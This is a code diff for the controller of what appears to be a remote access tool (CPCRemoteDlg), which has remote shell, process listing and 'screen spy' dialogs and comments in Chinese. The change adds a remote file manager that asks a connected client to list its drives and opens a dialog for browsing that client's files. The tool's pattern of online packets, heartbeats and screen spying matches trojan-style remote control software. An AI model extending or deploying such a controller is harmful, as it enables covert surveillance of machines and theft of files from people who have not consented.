@@ -11,6 +11,8 @@
 #include "CShellDlg.h"
 #include "CSystemDlg.h"
 #include "CScreenSpyDlg.h"
+#include "FileManagerDlg.h"
+
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -153,6 +155,7 @@ BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
 	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
+	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
 
 END_MESSAGE_MAP()
 
@@ -574,6 +577,8 @@ void CPCRemoteDlg::OnOnlineDesktop()
 void CPCRemoteDlg::OnOnlineFile()
 {
 	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_LIST_DRIVE;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -790,9 +795,9 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 	{
 		switch (pContext->m_Dialog[0])
 		{
-	//	case FILEMANAGER_DLG:
-	//		((CFileManagerDlg*)dlg)->OnReceiveComplete();
-	//		break;
+		case FILEMANAGER_DLG:
+			((CFileManagerDlg*)dlg)->OnReceiveComplete();
+			break;
 		case SCREENSPY_DLG:
 			((CScreenSpyDlg*)dlg)->OnReceiveComplete();
 			break;
@@ -824,11 +829,11 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 	//	break;
 	//case TOKEN_HEARTBEAT: // 回复心跳包
 	//{
-	//	BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
-	//	m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
+		//BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
+		//m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
 	//}
 
-	//break;
+	break;
 	case TOKEN_LOGIN: // 上线包
 
 	{
@@ -848,10 +853,10 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
 	}
 
 	break;
-	//case TOKEN_DRIVE_LIST: // 驱动器列表
-	//	// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
-	//	g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
-	//	break;
+	case TOKEN_DRIVE_LIST: // 驱动器列表
+		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
+		g_PCRemote->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
+		break;
 	case TOKEN_BITMAPINFO: //
 		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
 		g_PCRemote->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
@@ -1084,6 +1089,23 @@ LRESULT CPCRemoteDlg::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
 	catch (...) {}
 	return 0;
 }
+
+LRESULT CPCRemoteDlg::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
+{
+
+	ClientContext* pContext = (ClientContext*)lParam;
+
+	CFileManagerDlg* dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
+	// 设置父窗口为卓面
+	dlg->Create(IDD_FILE, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = FILEMANAGER_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+
+	return 0;
+}
+
 LRESULT CPCRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext* pContext = (ClientContext*)lParam;
